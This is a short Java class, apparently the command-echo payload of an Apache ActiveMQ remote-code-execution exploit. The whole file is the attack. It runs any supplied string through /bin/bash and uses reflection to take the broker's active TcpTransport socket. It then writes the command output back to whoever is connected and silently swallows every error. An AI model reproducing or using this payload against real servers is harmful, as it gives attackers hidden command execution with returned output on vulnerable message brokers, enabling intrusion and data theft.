import java.io.*;
import java.lang.reflect.Field;

public class CMDResponse {


    public void test(String cmd) throws IOException {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(new String[]{"/bin/bash","-c",cmd});
            Process start = processBuilder.start();
            InputStream inputStream = start.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int read = 0;
            while ((read = inputStream.read()) != -1){
                byteArrayOutputStream.write(read);
            }

            Thread thread = Thread.currentThread();
            Class<?> aClass = Class.forName("java.lang.Thread");
            Field target = aClass.getDeclaredField("target");
            target.setAccessible(true);
            org.apache.activemq.transport.tcp.TcpTransport transport = (org.apache.activemq.transport.tcp.TcpTransport)target.get(thread);
            Class<?> aClass1 = Class.forName("org.apache.activemq.transport.tcp.TcpTransport");
            Field socketfield = aClass1.getDeclaredField("socket");
            socketfield.setAccessible(true);
            java.net.Socket socket =(java.net.Socket) socketfield.get(transport);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write("\n".getBytes());
            outputStream.write(byteArrayOutputStream.toByteArray());
            outputStream.close();

        }catch (Exception e){

        }



    }
}
